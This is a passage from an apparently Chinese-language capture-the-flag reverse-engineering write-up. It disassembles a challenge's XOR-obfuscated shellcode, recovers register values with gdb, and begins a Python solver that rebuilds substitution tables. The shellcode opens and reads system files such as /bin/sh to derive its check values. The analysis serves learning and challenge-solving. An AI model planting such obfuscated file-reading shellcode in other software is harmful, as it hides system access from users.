0x31</span></span><br><span class="line"><span class="string">0x5555555d6468: 0xf6    0x48    0xb9    0x3b    0x3b    0x6f    0xc3    0x63</span></span><br><span class="line"><span class="string">0x5555555d6470: 0x64    0xc0    0xaa    0x48    0xba    0x48    0x4c    0x0b</span></span><br><span class="line"><span class="string">0x5555555d6478: 0xc3    0x63    0x64    0xc0    0xaa    0x48    0x31    0xd1</span></span><br><span class="line"><span class="string">0x5555555d6480: 0x51    0x48    0xb9    0x8c    0x57    0x82    0x75    0xd6</span></span><br><span class="line"><span class="string">0x5555555d6488: 0xf8    0xa9    0x7d    0x48    0xba    0xa3    0x32    0xf6</span></span><br><span class="line"><span class="string">0x5555555d6490: 0x16    0xf9    0x88    0xc8    0x0e    0x48    0x31    0xd1</span></span><br><span class="line"><span class="string">0x5555555d6498: 0x51    0x54    0x5f    0x6a    0x02    0x58    0x99    0x0f</span></span><br><span class="line"><span class="string">0x5555555d64a0: 0x05    0x48    0x97    0x31    0xc0    0x50    0x54    0x5e</span></span><br><span class="line"><span class="string">0x5555555d64a8: 0x6a    0x04    0x5a    0x0f    0x05    0x41    0x5d    0x6a</span></span><br><span class="line"><span class="string">0x5555555d64b0: 0x03    0x58    0x0f    0x05    0x31    0xf6    0x6a    0x6f</span></span><br><span class="line"><span class="string">0x5555555d64b8: 0x48    0xb9    0x59    0xe5    0x06    0x0c    0x2d    0xf6</span></span><br><span class="line"><span class="string">0x5555555d64c0: 0xd9    0x77    0x48    0xba    0x76    0x81    0x63    0x7a</span></span><br><span class="line"><span class="string">0x5555555d64c8: 0x02    0x8c    0xbc    0x05    0x48    0x31    0xd1    0x51</span></span><br><span class="line"><span class="string">0x5555555d64d0: 0x54    0x5f    0x6a    0x02    0x58    0x99    0x0f    0x05</span></span><br><span class="line"><span class="string">0x5555555d64d8: 0x48    0x97    0x31    0xc0    0x50    0x54    0x5e    0x6a</span></span><br><span class="line"><span class="string">0x5555555d64e0: 0x04    0x5a    0x0f    0x05    0x58    0x48    0xf7    0xd0</span></span><br><span class="line"><span class="string">0x5555555d64e8: 0x48    0xc1    0xe8    0x1d    0x48    0x99    0x6a    0x29</span></span><br><span class="line"><span class="string">0x5555555d64f0: 0x59    0x48    0xf7    0xf1    0x49    0x96    0x6a    0x03</span></span><br><span class="line"><span class="string">0x5555555d64f8: 0x58    0x0f    0x05    0xb8    0xef    0xbe    0xad    0xde</span></span><br><span class="line"><span class="string">0x5555555d6500: 0x44    0x01    0xe0    0x44    0x31    0xe8    0xc1    0xc8</span></span><br><span class="line"><span class="string">0x5555555d6508: 0x0b    0xf7    0xd0    0x44    0x31    0xf0    0x3d    0xef</span></span><br><span class="line"><span class="string">0x5555555d6510: 0xbe    0xad    0xde    0x75    0x05    0x6a    0x01    0x58</span></span><br><span class="line"><span class="string">0x5555555d6518: 0xeb    0x03    0x48    0x31    0xc0    0x50    0x53    0x5f</span></span><br><span class="line"><span class="string">0x5555555d6520: 0x54    0x5e    0x6a    0x08    0x5a    0x6a    0x01    0x58</span></span><br><span class="line"><span class="string">0x5555555d6528: 0x0f    0x05    0x55    0x5c    0x41    0xff    0xe7</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_bytes = parse_memory_dump(shellcode)</span><br><span class="line">disassembled_code = disasm(shellcode_bytes, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(disassembled_code)</span><br></pre></td></tr></table></figure></div></li><li>Result:<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"> 0:   54                      push   rsp</span><br><span class="line"> 1:   5d                      pop    rbp</span><br><span class="line"> 2:   31 f6                   xor    esi, esi</span><br><span class="line"> 4:   48 b9 a1 57 06 b8 62 3a 9f 37   movabs rcx, 0x379f3a62b80657a1</span><br><span class="line"> e:   48 ba 8e 35 6f d6 4d 49 f7 37   movabs rdx, 0x37f7494dd66f358e</span><br><span class="line">18:   48 31 d1                xor    rcx, rdx</span><br><span class="line">1b:   51                      push   rcx</span><br><span class="line">1c:   54                      push   rsp</span><br><span class="line">1d:   5f                      pop    rdi</span><br><span class="line">1e:   6a 02                   push   0x2</span><br><span class="line">20:   58                      pop    rax</span><br><span class="line">21:   99                      cdq</span><br><span class="line">22:   0f 05                   syscall</span><br><span class="line">24:   48 97                   xchg   rdi, rax</span><br><span class="line">26:   31 c0                   xor    eax, eax</span><br><span class="line">28:   50                      push   rax</span><br><span class="line">29:   54                      push   rsp</span><br><span class="line">2a:   5e                      pop    rsi</span><br><span class="line">2b:   6a 04                   push   0x4</span><br><span class="line">2d:   5a                      pop    rdx</span><br><span class="line">2e:   0f 05                   syscall</span><br><span class="line">30:   41 5c                   pop    r12</span><br><span class="line">32:   6a 03                   push   0x3</span><br><span class="line">34:   58                      pop    rax</span><br><span class="line">35:   0f 05                   syscall</span><br><span class="line">37:   31 f6                   xor    esi, esi</span><br><span class="line">39:   48 b9 3b 3b 6f c3 63 64 c0 aa   movabs rcx, 0xaac06463c36f3b3b</span><br><span class="line">43:   48 ba 48 4c 0b c3 63 64 c0 aa   movabs rdx, 0xaac06463c30b4c48</span><br><span class="line">4d:   48 31 d1                xor    rcx, rdx</span><br><span class="line">50:   51                      push   rcx</span><br><span class="line">51:   48 b9 8c 57 82 75 d6 f8 a9 7d   movabs rcx, 0x7da9f8d67582578c</span><br><span class="line">5b:   48 ba a3 32 f6 16 f9 88 c8 0e   movabs rdx, 0xec888f916f632a3</span><br><span class="line">65:   48 31 d1                xor    rcx, rdx</span><br><span class="line">68:   51                      push   rcx</span><br><span class="line">69:   54                      push   rsp</span><br><span class="line">6a:   5f                      pop    rdi</span><br><span class="line">6b:   6a 02                   push   0x2</span><br><span class="line">6d:   58                      pop    rax</span><br><span class="line">6e:   99                      cdq</span><br><span class="line">6f:   0f 05                   syscall</span><br><span class="line">71:   48 97                   xchg   rdi, rax</span><br><span class="line">73:   31 c0                   xor    eax, eax</span><br><span class="line">75:   50                      push   rax</span><br><span class="line">76:   54                      push   rsp</span><br><span class="line">77:   5e                      pop    rsi</span><br><span class="line">78:   6a 04                   push   0x4</span><br><span class="line">7a:   5a                      pop    rdx</span><br><span class="line">7b:   0f 05                   syscall</span><br><span class="line">7d:   41 5d                   pop    r13</span><br><span class="line">7f:   6a 03                   push   0x3</span><br><span class="line">81:   58                      pop    rax</span><br><span class="line">82:   0f 05                   syscall</span><br><span class="line">84:   31 f6                   xor    esi, esi</span><br><span class="line">86:   6a 6f                   push   0x6f</span><br><span class="line">88:   48 b9 59 e5 06 0c 2d f6 d9 77   movabs rcx, 0x77d9f62d0c06e559</span><br><span class="line">92:   48 ba 76 81 63 7a 02 8c bc 05   movabs rdx, 0x5bc8c027a638176</span><br><span class="line">9c:   48 31 d1                xor    rcx, rdx</span><br><span class="line">9f:   51                      push   rcx</span><br><span class="line">a0:   54                      push   rsp</span><br><span class="line">a1:   5f                      pop    rdi</span><br><span class="line">a2:   6a 02                   push   0x2</span><br><span class="line">a4:   58                      pop    rax</span><br><span class="line">a5:   99                      cdq</span><br><span class="line">a6:   0f 05                   syscall</span><br><span class="line">a8:   48 97                   xchg   rdi, rax</span><br><span class="line">aa:   31 c0                   xor    eax, eax</span><br><span class="line">ac:   50                      push   rax</span><br><span class="line">ad:   54                      push   rsp</span><br><span class="line">ae:   5e                      pop    rsi</span><br><span class="line">af:   6a 04                   push   0x4</span><br><span class="line">b1:   5a                      pop    rdx</span><br><span class="line">b2:   0f 05                   syscall</span><br><span class="line">b4:   58                      pop    rax</span><br><span class="line">b5:   48 f7 d0                not    rax</span><br><span class="line">b8:   48 c1 e8 1d             shr    rax, 0x1d</span><br><span class="line">bc:   48 99                   cqo</span><br><span class="line">be:   6a 29                   push   0x29</span><br><span class="line">c0:   59                      pop    rcx</span><br><span class="line">c1:   48 f7 f1                div    rcx</span><br><span class="line">c4:   49 96                   xchg   r14, rax</span><br><span class="line">c6:   6a 03                   push   0x3</span><br><span class="line">c8:   58                      pop    rax</span><br><span class="line">c9:   0f 05                   syscall</span><br><span class="line">cb:   b8 ef be ad de          mov    eax, 0xdeadbeef</span><br><span class="line">d0:   44 01 e0                add    eax, r12d</span><br><span class="line">d3:   44 31 e8                xor    eax, r13d</span><br><span class="line">d6:   c1 c8 0b                ror    eax, 0xb</span><br><span class="line">d9:   f7 d0                   not    eax</span><br><span class="line">db:   44 31 f0                xor    eax, r14d</span><br><span class="line">de:   3d ef be ad de          cmp    eax, 0xdeadbeef</span><br><span class="line">e3:   75 05                   jne    0xea</span><br><span class="line">e5:   6a 01                   push   0x1</span><br><span class="line">e7:   58                      pop    rax</span><br><span class="line">e8:   eb 03                   jmp    0xed</span><br><span class="line">ea:   48 31 c0                xor    rax, rax</span><br><span class="line">ed:   50                      push   rax</span><br><span class="line">ee:   53                      push   rbx</span><br><span class="line">ef:   5f                      pop    rdi</span><br><span class="line">f0:   54                      push   rsp</span><br><span class="line">f1:   5e                      pop    rsi</span><br><span class="line">f2:   6a 08                   push   0x8</span><br><span class="line">f4:   5a                      pop    rdx</span><br><span class="line">f5:   6a 01                   push   0x1</span><br><span class="line">f7:   58                      pop    rax</span><br><span class="line">f8:   0f 05                   syscall</span><br><span class="line">fa:   55                      push   rbp</span><br><span class="line">fb:   5c                      pop    rsp</span><br><span class="line">fc:   41 ff e7                jmp    r15</span><br></pre></td></tr></table></figure></div></li></ul><ol start="4"><li>分析 shellcode</li></ol><ul><li>0xdeadbeef is not 0xdeadbeef<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cb:   b8 ef be ad de          mov    eax, 0xdeadbeef</span><br><span class="line">de:   3d ef be ad de          cmp    eax, 0xdeadbeef</span><br></pre></td></tr></table></figure></div>觀察 shellcode 可以看到總共有兩個地方出現了 0xdeadbeef，但其實從 ida 看後續行為可以發現它其實是把第一個 0xdeadbeef 改成我們處理過後的 input，然後第二個放成一個特定的值。</li><li>主要行為：</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 設定 r12</span><br><span class="line"># 設定 r13</span><br><span class="line"># 設定 r14</span><br><span class="line">cb:   b8 ef be ad de          mov    eax, 0xdeadbeef # 放進處理後的輸入 </span><br><span class="line">d0:   44 01 e0                add    eax, r12d       # 和 r12、r13、r14 做一些運算</span><br><span class="line">d3:   44 31 e8                xor    eax, r13d</span><br><span class="line">d6:   c1 c8 0b                ror    eax, 0xb</span><br><span class="line">d9:   f7 d0                   not    eax</span><br><span class="line">db:   44 31 f0                xor    eax, r14d </span><br><span class="line">de:   3d ef be ad de          cmp    eax, 0xdeadbeef # 比較一個特定的值</span><br></pre></td></tr></table></figure></div><p>理解後目標就很明確了，我們只需要找出那三個暫存器的值就可以拿到 flag 了！<br>至於怎麼找值有很多方式，列出一些給大家參考：</p><ol><li>如果夠猛，可以直接靜態分析出來，但這有點硬 XD，推薦後面兩種。</li><li>另外一種是模仿剛剛用來模擬 clinet 的 shellcode，再配合 ida 的 remote linux debugger 動態分析。</li><li>當然直接用 gdb 分析也可以。</li></ol><p>這邊選擇第三種，用 gdb 來分析。先 <code>break main</code> 之後走到 main，然後設定 <code>watch $r12</code>、<code>watch $r13</code>、<code>watch $r14</code>完 <code>continue</code>，就可以依序看到三個暫存器被設定：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/blade_r12.png"                      alt="r12"                ></p><div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r12 = 0x464C457F</span><br><span class="line">r13 = 0x746F6F72</span><br><span class="line">r14 = 0x31F3831F</span><br></pre></td></tr></table></figure></div><p>從 ida 取出要比較的常數：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/blade_xmm.png"                      alt="xmm"                ></p><p>把他轉成 uint32 方便待會的操作：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/blade_uint32_2.png"                      alt="uint32"                ><br>驗算一下也確實是 64 bytes。</p><h2 id="0x4-Exploits"><a href="#0x4-Exploits" class="headerlink" title="0x4 Exploits"></a>0x4 Exploits</h2><h3 id="generator-py"><a href="#generator-py" class="headerlink" title="generator.py"></a>generator.py</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ===== Part 1: Swap mapping table =====</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Improved Swap Mapping Table</span></span><br><span class="line">original_chars = <span class="string">&#x27;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;&#x27;</span></span><br><span class="line">shuffled_chars = <span class="string">&#x27;HfVl&#123;qPcCYNMoRi7D8Jr&#125;espOL4FhwdWAtTGZba5Ugjvnx2QkKE3IS0yuz6BX19m&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Generating index mapping using list comprehension for efficiency</span></span><br><span class="line">index_mapping = [shuffled_chars.find(char) <span class="keyword">for</span> char <span class="keyword">in</span> original_chars]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Index Mapping: &quot;</span>, index_mapping)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== Part 2: Bitwise encryption mapping table =====</span></span><br><span class="line"></span><br><span class="line">plain_string = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x5555555d63e0: 0x00    0x01    0x02    0x03    0x04    0x05    0x06    0x07</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0x08    0x09    0x0a    0x0b    0x0c    0x0d    0x0e    0x0f</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x10    0x11    0x12    0x13    0x14    0x15    0x16    0x17</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x18    0x19    0x1a    0x1b    0x1c    0x1d    0x1e    0x1f</span></span><br><span class="line"><span class="string">0x5555555d6400: 0x20    0x21    0x22    0x23    0x24    0x25    0x26    0x27</span></span><br><span class="line"><span class="string">0x5555555d6408: 0x28    0x29    0x2a    0x2b    0x2c    0x2d    0x2e    0x2f</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x30    0x31    0x32    0x33    0x34    0x35    0x36    0x37</span></span><br><span class="line"><span class="string">0x5555555d6418: 0x38    0x39    0x3a    0x3b    0x3c    0x3d    0x3e    0x3f</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0x40    0x41    0x42    0x43    0x44    0x45    0x46    0x47</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0x48    0x49    0x4a    0x4b    0x4c    0x4d    0x4e    0x4f</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x50    0x51    0x52    0x53    0x54    0x55    0x56    0x57</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x58    0x59    0x5a    0x5b    0x5c    0x5d    0x5e    0x5f</span></span><br><span class="line"><span class="string">0x5555555d6400: 0x60    0x61    0x62    0x63    0x64    0x65    0x66    0x67</span></span><br><span class="line"><span class="string">0x5555555d6408: 0x68    0x69    0x6a    0x6b    0x6c    0x6d    0x6e    0x6f</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x70    0x71    0x72    0x73    0x74    0x75    0x76    0x77</span></span><br><span class="line"><span class="string">0x5555555d6418: 0x78    0x79    0x7a    0x7b    0x7c    0x7d    0x7e    0x7f</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0x80    0x81    0x82    0x83    0x84    0x85    0x86    0x87</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0x88    0x89    0x8a    0x8b    0x8c    0x8d    0x8e    0x8f</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x90    0x91    0x92    0x93    0x94    0x95    0x96    0x97</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x98    0x99    0x9a    0x9b    0x9c    0x9d    0x9e    0x9f</span></span><br><span class="line"><span class="string">0x5555555d6400: 0xa0    0xa1    0xa2    0xa3    0xa4    0xa5    0xa6    0xa7</span></span><br><span class="line"><span class="string">0x5555555d6408: 0xa8    0xa9    0xaa    0xab    0xac    0xad    0xae    0xaf</span></span><br><span class="line"><span class="string">0x5555555d6410: 0xb0    0xb1    0xb2    0xb3    0xb4    0xb5    0xb6    0xb7</span></span><br><span class="line"><span class="string">0x5555555d6418: 0xb8    0xb9    0xba    0xbb    0xbc    0xbd    0xbe    0xbf</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0xc0    0xc1    0xc2    0xc3    0xc4    0xc5    0xc6    0xc7</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0xc8    0xc9    0xca    0xcb    0xcc    0xcd    0xce    0xcf</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0xd0    0xd1    0xd2    0xd3    0xd4    0xd5    0xd6    0xd7</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0xd8    0xd9    0xda    0xdb    0xdc    0xdd    0xde    0xdf</span></span><br><span class="line"><span class="string">0x5555555d6400: 0xe0    0xe1    0xe2    0xe3    0xe4    0xe5    0xe6    0xe7</span></span><br><span class="line"><span class="string">0x5555555d6408: 0xe8    0xe9    0xea    0xeb    0xec    0xed    0xee    0xef</span></span><br><span class="line"><span class="string">0x5555555d6410: 0xf0    0xf1    0xf2    0xf3    0xf4    0xf5    0xf6    0xf7</span></span><br><span class="line"><span class="string">0x5555555d6418: 0xf8    0xf9    0xfa    0xfb    0xfc    0xfd    0xfe    0xff</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">encrypted_string = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x5555555d63e0: 0xfb    0x7b    0x4e    0xbb    0x51    0x15    0x8d    0xdb</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0xb0    0xac    0xa5    0x8e    0xaa    0xb2    0x60    0xeb</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x63    0x5c    0xde    0x42    0x2b    0xc6    0xa6    0x35</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x30    0x43    0xd6    0x5f    0xbd    0x24    0xb1    0xe3</span></span><br><span class="line"><span class="string">0x5555555d6400: 0x8c    0xa7    0xd5    0x2a    0x7c    0x6d    0x8b    0x17</span></span><br><span class="line"><span class="string">0x5555555d6408: 0x9d    0x83    0xfe    0x69    0x10    0x59    0xa9    0x9e</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x0f    0x1c    0x66    0x97    0x5b    0x61    0xed    0xad</span></span><br><span class="line"><span class="string">0x5555555d6418: 0xe0    0xda    0x27    0x06    0x25    0xdc    0x5e    0xe7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0x41    0x32    0xd2    0xd9    0x8f    0xee    0xaf    0x03</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0x93    0x3a    0x00    0xa2    0xe1    0xb3    0xec    0x81</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x9f    0xca    0x58    0xb7    0x79    0xfd    0x3b    0xa0</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x02    0x0c    0xcb    0xa8    0x80    0xc0    0x16    0x4d</span></span><br><span class="line"><span class="string">0x5555555d6400: 0x2f    0x75    0x71    0x0a    0x04    0x39    0xff    0xc1</span></span><br><span class="line"><span class="string">0x5555555d6408: 0x9c    0xab    0xef    0xa4    0xd8    0xe2    0x14    0xc2</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x6c    0x64    0x1e    0x6b    0x7e    0x99    0x2e    0x09</span></span><br><span class="line"><span class="string">0x5555555d6418: 0x0b    0x86    0x74    0x6a    0xc4    0x2d    0x4f    0xf9</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0xfa    0x94    0xb6    0x1f    0x89    0x6f    0x5d    0xe8</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0xea    0xb5    0x5a    0x65    0x88    0xc5    0x7f    0x77</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x11    0xcf    0xf1    0x1b    0x3f    0xf4    0x48    0x47</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x12    0xe4    0xba    0xdf    0xe9    0x62    0x6e    0xb4</span></span><br><span class="line"><span class="string">0x5555555d6400: 0x96    0xcd    0x13    0x53    0x4b    0x28    0xd7    0xd1</span></span><br><span class="line"><span class="string">0x5555555d6408: 0x33    0xb8    0xe6    0x7a    0x2c    0x9b    0x29    0x44</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x52    0xf7    0x20    0xf2    0x31    0xd3    0xb9    0x40</span></span><br><span class="line"><span class="string">0x5555555d6418: 0xd0    0x34    0xf5    0x54    0x1a    0x01    0xa1    0x92</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0xfc    0x85    0x07    0xbe    0xdd    0xbc    0x19    0xf3</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0x36    0xf6    0x72    0x98    0x4c    0x7d    0xc7    0xd4</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x45    0x4a    0x9a    0xc3    0x8a    0xe5    0x50    0x46</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0xcc    0x68    0x76    0x67    0xc9    0x0e    0x3c    0x57</span></span><br><span class="line"><span class="string">0x5555555d6400: 0xf0    0x22    0xbf    0x26    0x84    0x0d    0x90    0xa3</span></span><br><span class="line"><span class="string">0x5555555d6408: 0xae    0x3d    0x1d    0xc8    0x91    0x05    0x87    0x70</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x08    0x73    0x21    0x49    0x55    0x3e    0x37    0x23</span></span><br><span class="line"><span class="string">0x5555555d6418: 0x18    0x56    0xce    0x82    0x38    0x95    0x78    0xf8</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_memory_dump</span>(<span class="params">dump</span>):</span><br><span class="line">    bytes_array = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> dump.strip().split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">        parts = line.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(parts) &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        byte_strs = parts[<span class="number">1</span>].split()</span><br><span class="line">        <span class="keyword">for</span> byte_str <span class="keyword">in</span> byte_strs:</span><br><span class="line">            bytes_array.append(<span class="built_in">int</span>(byte_str.strip(), <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> bytes_array</span><br><span class="line"></span><br><span class="line"><span class="comment"># Parsing plain and encrypted strings</span></span><br><span class="line">plain_bytes = parse_memory_dump(plain_string)</span><br><span class="line">encrypted_bytes = parse_memory_dump(encrypted_string)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Creating a decryption map from encrypted bytes to plain bytes</span></span><br><span class="line">decryption_map = &#123;encrypted: plain <span class="keyword">for</span> plain, encrypted <span class="keyword">in</span> <span 